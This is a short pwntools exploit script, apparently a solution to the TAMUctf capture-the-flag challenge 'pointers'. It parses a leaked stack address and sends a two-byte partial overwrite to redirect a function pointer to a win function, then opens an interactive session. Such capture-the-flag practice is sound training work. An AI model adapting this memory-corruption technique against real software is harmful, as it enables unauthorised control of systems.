from pwn import *

context.encoding = 'latin-1'
# io = remote("tamuctf.com", 443, ssl=True, sni="pointers")
io = gdb.debug("./pointers")
elf = ELF("./pointers")

io.recvuntil("All my functions are being stored at ")
stack_func_ptr = int(io.recvline().strip(), 16)
win_stack_func_ptr = stack_func_ptr + 8
info(f"Win Stack Pointer: {hex(win_stack_func_ptr)}")
win_last_two_bits = win_stack_func_ptr & 0x000000000000FFFF
info(f"Win Last Two Bits: {hex(win_last_two_bits)}")

io.clean()
io.fit({
    8:p16(win_last_two_bits + 0x20)
    })
io.interactive()
